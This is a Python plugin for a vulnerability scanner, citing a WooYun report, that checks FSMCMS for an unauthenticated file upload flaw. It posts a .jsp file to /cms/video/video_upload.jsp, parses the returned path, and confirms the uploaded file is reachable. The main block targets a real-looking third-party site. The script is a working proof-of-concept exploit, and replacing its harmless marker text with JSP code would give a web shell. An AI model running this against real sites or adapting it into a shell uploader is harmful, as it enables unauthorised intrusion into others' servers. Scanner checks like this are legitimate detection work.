#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0144300
#__Author__ = 上善若水
#_PlugName_ = fscms Plugin
#_FileName_ = fscms.py


import re

def assign(service, arg):
    if service == "fsmcms":
        return True, arg    

def audit(arg):
    raw = '''
POST /cms/video/video_upload.jsp HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: Keep-Alive
Content-Type: multipart/form-data; boundary=---------------------------26574492824214
Content-Length: 331

-----------------------------26574492824214
Content-Disposition: form-data; name="file"; filename="bugscan.jsp"
Content-Type: application/octet-stream

testvul_upload_file_test
-----------------------------26574492824214
Content-Disposition: form-data; name="upload"

upload
-----------------------------26574492824214--
'''
    
    url = arg + 'cms/video/video_upload.jsp'
    code1, head1, res1, errcode1, _url1 = curl.curl2(url,raw=raw)
    if not re.findall('opener.document.all.VideoUrl.value=\'(.*?).flv\'',res1):
        pass
    else:
        shell_path = re.findall('opener.document.all.VideoUrl.value=\'(.*?).flv\'',res1)[0] + '.jsp'    
        code, head, res, errcode, _url = curl.curl2(arg+shell_path)
        if code == 200 and 'testvul_upload_file_test' in res:
            security_hole(arg+shell_path)


if __name__ == '__main__':
    from dummy import *
    audit(assign('fsmcms','http://www.cre.cn/')[1])